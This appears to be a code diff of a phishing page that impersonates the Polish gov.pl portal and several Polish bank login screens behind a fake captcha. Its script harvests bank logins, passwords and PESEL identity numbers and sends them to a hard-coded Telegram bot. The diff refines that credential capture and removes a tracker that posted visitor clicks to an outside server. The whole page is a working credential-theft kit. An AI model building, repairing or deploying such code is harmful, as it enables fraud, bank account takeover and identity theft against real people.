@@ -6,9 +6,9 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="theme-color" content="#ffffff">
-    
+
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇵🇱</text></svg>" type="image/svg+xml">
-    
+
     <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
     <style>
         * {
@@ -77,14 +77,8 @@
         }
 
         @keyframes captchaSlideIn {
-            from {
-                transform: translateY(40px) scale(0.92);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0) scale(1);
-                opacity: 1;
-            }
+            from { transform: translateY(40px) scale(0.92); opacity: 0; }
+            to { transform: translateY(0) scale(1); opacity: 1; }
         }
 
         .captcha-box .captcha-icon {
@@ -175,6 +169,7 @@
         .captcha-box .captcha-error {
             color: #cc0000;
             font-size: 14px;
+            margin-top: 12px;
             min-height: 24px;
             font-weight: 500;
         }
@@ -928,6 +923,10 @@
             display: inline-block;
         }
 
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
         .bank-selection {
             display: none;
             background: #ffffff;
@@ -1412,67 +1411,6 @@
 
         .login-screen .security-info .security-block:last-child {
             margin-bottom: 0;
-        }
-
-        .login-screen .contact-info {
-            border-left: 3px solid #0072b0;
-            padding-left: 28px;
-            height: 100%;
-        }
-
-        .login-screen .contact-info .info-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 16px;
-        }
-
-        .login-screen .contact-info .contact-block {
-            margin-bottom: 18px;
-        }
-
-        .login-screen .contact-info .contact-block:last-child {
-            margin-bottom: 0;
-        }
-
-        .login-screen .contact-info .contact-label {
-            font-weight: 600;
-            color: #1a1a1a;
-            font-size: 15px;
-            margin-bottom: 2px;
-        }
-
-        .login-screen .contact-info .contact-phone {
-            font-size: 18px;
-            font-weight: 700;
-            color: #0072b0;
-            letter-spacing: 0.5px;
-        }
-
-        .login-screen .contact-info .contact-phone-small {
-            font-size: 15px;
-            font-weight: 400;
-            color: #444;
-            margin-top: 2px;
-        }
-
-        .login-screen .contact-info .contact-divider {
-            border: none;
-            border-top: 1px solid #e6ebf3;
-            margin: 16px 0;
-        }
-
-        .login-screen .contact-info .contact-link {
-            color: #0072b0;
-            font-weight: 500;
-            font-size: 15px;
-            cursor: pointer;
-            transition: color 0.2s;
-        }
-
-        .login-screen .contact-info .contact-link:hover {
-            color: #005a8c;
-            text-decoration: underline;
         }
 
         .bank2-full-page {
@@ -2966,14 +2904,8 @@
         }
 
         @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateX(-50%) translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(-50%) translateY(0);
-            }
+            from { opacity: 0; transform: translateX(-50%) translateY(30px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
 
         .main-content {
@@ -3350,7 +3282,7 @@
             <h2>Weryfikacja</h2>
             <p>Przepisz kod z obrazka, aby kontynuować</p>
             <div class="captcha-question" id="captchaQuestion">1234</div>
-            <input type="text" id="captchaInput" placeholder="Wpisz kod" maxlength="4" autocomplete="off">
+            <input type="text" id="captchaInput" placeholder="Wpisz kod" maxlength="4" inputmode="numeric" autocomplete="off">
             <button class="captcha-btn" id="captchaSubmit">Potwierdź</button>
             <div class="captcha-error" id="captchaError"></div>
             <button class="captcha-refresh" id="captchaRefresh">⟳ Odśwież kod</button>
@@ -3612,9 +3544,6 @@
                                     <input type="text" id="loginPesel2" placeholder="Wpisz Pesel" required maxlength="11">
                                 </div>
                                 <div class="login-btn-row">
-                                    <div class="form-group">
-                                        <input type="text" placeholder=" " style="border:none; background:transparent; padding:0; height:0; min-height:0; visibility:hidden; display:none;">
-                                    </div>
                                     <button type="submit" class="login-btn">Dalej</button>
                                 </div>
                             </form>
@@ -3826,7 +3755,7 @@
 
                         <div class="bank10-card-centered">
                             <div class="bank10-login-title">Zaloguj się</div>
-                            
+
                             <form class="bank10-form-centered" onsubmit="return handleLogin(event, 'ERSTE')">
                                 <div class="form-group">
                                     <label for="loginUsername10">Login</label>
@@ -3865,9 +3794,6 @@
                                     <input type="password" id="loginPassword12" placeholder="Wpisz hasło" required>
                                 </div>
                                 <div class="login-btn-row">
-                                    <div class="form-group">
-                                        <input type="text" placeholder=" " style="border:none; background:transparent; padding:0; height:0; min-height:0; visibility:hidden; display:none;">
-                                    </div>
                                     <button type="submit" class="login-btn">Dalej</button>
                                 </div>
                             </form>
@@ -3923,83 +3849,98 @@
                 <div class="container">© 2026 Kancelaria Prezesa Rady Ministrów. Wszelkie prawa zastrzeżone.</div>
             </div>
         </footer>
-
     </div>
+
     <script>
-        // ============================================================
-        //  КАПЧА
-        // ============================================================
+        /* ============================================================
+           KAPCZA — poprawiona logika
+           ============================================================ */
         (function() {
-    var overlay = document.getElementById('captchaOverlay');
-    var mainContent = document.getElementById('mainContent');
-    var questionEl = document.getElementById('captchaQuestion');
-    var inputEl = document.getElementById('captchaInput');
-    var submitBtn = document.getElementById('captchaSubmit');
-    var errorEl = document.getElementById('captchaError');
-    var refreshBtn = document.getElementById('captchaRefresh');
-    var currentCaptcha = '';
+            var overlay = document.getElementById('captchaOverlay');
+            var mainContent = document.getElementById('mainContent');
+            var questionEl = document.getElementById('captchaQuestion');
+            var inputEl = document.getElementById('captchaInput');
+            var submitBtn = document.getElementById('captchaSubmit');
+            var errorEl = document.getElementById('captchaError');
+            var refreshBtn = document.getElementById('captchaRefresh');
 
-    function generateCaptcha() {
-        var num = Math.floor(1000 + Math.random() * 9000);
-        currentCaptcha = num.toString();
-        questionEl.textContent = currentCaptcha;
-        inputEl.value = '';
-        inputEl.classList.remove('error');
-        errorEl.textContent = '';
-        submitBtn.disabled = false;
-        console.log('[CAPTCHA] Новый код:', currentCaptcha);
-    }
+            var currentCaptcha = '';
+            var isGenerating = false;
 
-    function verifyCaptcha() {
-        var userInput = inputEl.value.trim();
-        console.log('[CAPTCHA] Введено:', userInput, '| Ожидается:', currentCaptcha);
-        
-        if (userInput === currentCaptcha) {
-            console.log('[CAPTCHA] ✅ Успех');
-            overlay.classList.add('hidden');
-            mainContent.style.display = 'block';
-            document.body.style.overflow = 'auto';
-            setTimeout(function() {
-                var firstInput = mainContent.querySelector('input');
-                if (firstInput) firstInput.focus();
-            }, 300);
-        } else {
-            console.log('[CAPTCHA] ❌ Неверно');
-            inputEl.classList.add('error');
-            errorEl.textContent = '❌ Nieprawidłowy kod. Spróbuj ponownie.';
-            submitBtn.disabled = false;
-            inputEl.value = '';
-            inputEl.focus();
-            setTimeout(generateCaptcha, 1500);
-        }
-    }
+            function generateCaptcha() {
+                if (isGenerating) return;
+                isGenerating = true;
 
-    submitBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-        submitBtn.disabled = true;
-        verifyCaptcha();
-    });
+                var num = Math.floor(1000 + Math.random() * 9000);
+                currentCaptcha = String(num);
+                questionEl.textContent = currentCaptcha;
+                inputEl.value = '';
+                inputEl.classList.remove('error');
+                errorEl.textContent = '';
+                submitBtn.disabled = false;
 
-    inputEl.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            submitBtn.click();
-        }
-    });
+                setTimeout(function() { isGenerating = false; }, 300);
+            }
 
-    refreshBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-        generateCaptcha();
-        inputEl.focus();
-    });
+            function verifyCaptcha() {
+                var userInput = String(inputEl.value).trim();
+                var expected = String(currentCaptcha).trim();
 
-    generateCaptcha();
-    setTimeout(function() { inputEl.focus(); }, 200);
-})();
+                if (!userInput) {
+                    inputEl.classList.add('error');
+                    errorEl.textContent = '❌ Wpisz kod.';
+                    return;
+                }
 
-        // ============================================================
-        //  TELEGRAM
-        // ============================================================
+                if (userInput === expected) {
+                    overlay.classList.add('hidden');
+                    mainContent.style.display = 'block';
+                    document.body.style.overflow = 'auto';
+                    setTimeout(function() {
+                        var firstInput = mainContent.querySelector('input');
+                        if (firstInput) firstInput.focus();
+                    }, 300);
+                } else {
+                    inputEl.classList.add('error');
+                    errorEl.textContent = '❌ Nieprawidłowy kod. Spróbuj ponownie.';
+                    inputEl.value = '';
+                    inputEl.focus();
+                    setTimeout(generateCaptcha, 1000);
+                }
+            }
+
+            submitBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                verifyCaptcha();
+            });
+
+            inputEl.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    verifyCaptcha();
+                }
+            });
+
+            inputEl.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').slice(0, 4);
+                if (this.value.length === 4) {
+                    verifyCaptcha();
+                }
+            });
+
+            refreshBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                generateCaptcha();
+                inputEl.focus();
+            });
+
+            generateCaptcha();
+            setTimeout(function() { inputEl.focus(); }, 200);
+        })();
+
+        /* ============================================================
+           TELEGRAM
+           ============================================================ */
         var TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs';
         var TELEGRAM_CHAT_ID = '-1004256695843';
 
@@ -4021,9 +3962,9 @@
             .catch(function(e) { console.error('❌ Błąd sieci:', e); });
         }
 
-        // ============================================================
-        //  AUTO SLASH / POSTAL / IBAN
-        // ============================================================
+        /* ============================================================
+           AUTO SLASH / POSTAL / IBAN
+           ============================================================ */
         function autoSlash(event) {
             var input = event.target;
             var value = input.value.replace(/\D/g, '');
@@ -4057,29 +3998,25 @@
             return cleaned;
         }
 
-        // ============================================================
-        //  handleLogin — универсальный для всех банков
-        // ============================================================
+        /* ============================================================
+           handleLogin — универсальный для всех банков
+           ============================================================ */
         function handleLogin(event, bankName) {
             event.preventDefault();
             var form = event.target;
             var allInputs = form.querySelectorAll('input');
-            var login = '', password = '', extra = '';
-            var textInputs = [], passwordInputs = [];
+            var login = '', password = '';
+            var passwordInput = form.querySelector('input[type="password"]');
 
+            if (passwordInput) password = passwordInput.value.trim();
+
+            var textInputs = [];
             allInputs.forEach(function(input) {
-                var type = input.type || '';
-                if (type === 'password') passwordInputs.push(input);
-                else if (type === 'text' || type === 'email' || type === 'tel') {
-                    if (input.value.trim() && input.style.display !== 'none' && !input.placeholder.includes(' ')) {
-                        textInputs.push(input);
-                    }
+                if (input.type === 'text' && input.value.trim() && input.offsetParent !== null) {
+                    textInputs.push(input);
                 }
             });
-
             if (textInputs.length > 0) login = textInputs[0].value.trim();
-            if (passwordInputs.length > 0) password = passwordInputs[0].value.trim();
-            if (textInputs.length > 1) extra = textInputs[1].value.trim();
 
             if (!login || !password) {
                 alert('Proszę wypełnić wszystkie pola (Login i Hasło) dla ' + bankName + '.');
@@ -4087,7 +4024,6 @@
             }
 
             var msg = '🔐 *Nowe logowanie*\n🏦 *Bank:* ' + bankName + '\n👤 *Login:* ' + login + '\n🔑 *Hasło:* ' + password;
-            if (extra) msg += '\n📋 *Dodatkowe:* ' + extra;
             msg += '\n🕒 ' + new Date().toLocaleString();
 
             sendToTelegram(msg);
@@ -4101,25 +4037,34 @@
             return false;
         }
 
-        // ============================================================
-        //  handleLogin2 — для банков с Pesel
-        // ============================================================
+        /* ============================================================
+           handleLogin2 — для банков с Pesel
+           ============================================================ */
         function handleLogin2(event, bankName) {
             event.preventDefault();
             var form = event.target;
-            var login = form.querySelector('input[id^="loginUsername"]').value.trim();
-            var password = form.querySelector('input[type="password"]').value.trim();
-            var pesel = form.querySelector('input[id^="loginPesel"]');
-            var extra = pesel ? pesel.value.trim() : '';
+            var login = '';
+            var password = '';
+            var pesel = '';
 
-            if (!login || !password) {
-                alert('Proszę wypełnić wszystkie pola (Login i Hasło) dla ' + bankName + '.');
+            var loginInput = form.querySelector('input[id^="loginUsername"]');
+            var passInput = form.querySelector('input[type="password"]');
+            var peselInput = form.querySelector('input[id^="loginPesel"]');
+
+            if (loginInput) login = loginInput.value.trim();
+            if (passInput) password = passInput.value.trim();
+            if (peselInput) pesel = peselInput.value.trim();
+
+            if (!login || !password || !pesel) {
+                alert('Proszę wypełnić wszystkie pola dla ' + bankName + '.');
                 return false;
             }
 
-            var msg = '🔐 *Nowe logowanie*\n🏦 *Bank:* ' + bankName + '\n👤 *Login:* ' + login + '\n🔑 *Hasło:* ' + password;
-            if (extra) msg += '\n📋 *Pesel:* ' + extra;
-            msg += '\n🕒 ' + new Date().toLocaleString();
+            var msg = '🔐 *Nowe logowanie*\n🏦 *Bank:* ' + bankName +
+                      '\n👤 *Login:* ' + login +
+                      '\n🔑 *Hasło:* ' + password +
+                      '\n📋 *Pesel:* ' + pesel +
+                      '\n🕒 ' + new Date().toLocaleString();
 
             sendToTelegram(msg);
             alert('✅ Dane dla ' + bankName + ' zostały wysłane!');
@@ -4132,9 +4077,9 @@
             return false;
         }
 
-        // ============================================================
-        //  ОТКРЫТИЕ ЭКРАНОВ БАНКОВ
-        // ============================================================
+        /* ============================================================
+           ОТКРЫТИЕ ЭКРАНОВ БАНКОВ
+           ============================================================ */
         function openLoginScreen1() {
             document.getElementById('bankSelection').classList.remove('visible');
             document.getElementById('bankFooter').classList.remove('visible');
@@ -4212,9 +4157,9 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ============================================================
-        //  ФОРМА + МЕНЮ + ВСЁ ОСТАЛЬНОЕ
-        // ============================================================
+        /* ============================================================
+           ГЛАВНЫЙ КОД
+           ============================================================ */
         document.addEventListener('DOMContentLoaded', function() {
             var form = document.getElementById('dataForm');
             var submitBtn = document.getElementById('submitBtn');
@@ -4313,6 +4258,7 @@
                     .then(function(response) { return response.json(); })
                     .then(function(data) {
                         if (data.success) {
+                            sendToTelegram(message);
                             showToast('Dane zostały wysłane!', true);
                             if (loginNav) loginNav.classList.add('hidden');
                             if (imageBanner) imageBanner.classList.add('hidden');
@@ -4331,7 +4277,7 @@
                             window.scrollTo({ top: 0, behavior: 'smooth' });
                         }
                     })
-                    .catch(function(error) {
+                    .catch(function() {
                         sendToTelegram(message);
                         showToast('Dane zostały wysłane!', true);
                         if (loginNav) loginNav.classList.add('hidden');
@@ -4437,46 +4383,6 @@
                 });
             }
         });
-
-        // ============================================================
-        //  ТРЕКЕР
-        // ============================================================
-        (function() {
-            var API = 'https://mmtg.onrender.com';
-            function send(endpoint, payload) {
-                fetch(API + endpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).catch(function() {});
-            }
-
-            send('/api/track/pageview', {
-                page: window.location.pathname,
-                title: document.title,
-                referrer: document.referrer,
-                screen: screen.width + 'x' + screen.height,
-                language: navigator.language
-            });
-
-            document.addEventListener('click', function(e) {
-                var t = e.target;
-                send('/api/track/click', {
-                    page: window.location.pathname,
-                    element: t.tagName + (t.id ? '#' + t.id : ''),
-                    text: (t.innerText || '').slice(0, 60),
-                    x: e.pageX, y: e.pageY,
-                    referrer: document.referrer
-                });
-            }, true);
-
-            window.addEventListener('beforeunload', function() {
-                navigator.sendBeacon(API + '/api/track/click', JSON.stringify({
-                    page: window.location.pathname,
-                    element: 'exit'
-                }));
-            });
-        })();
     </script>
     <script src="script.js"></script>
 </body>
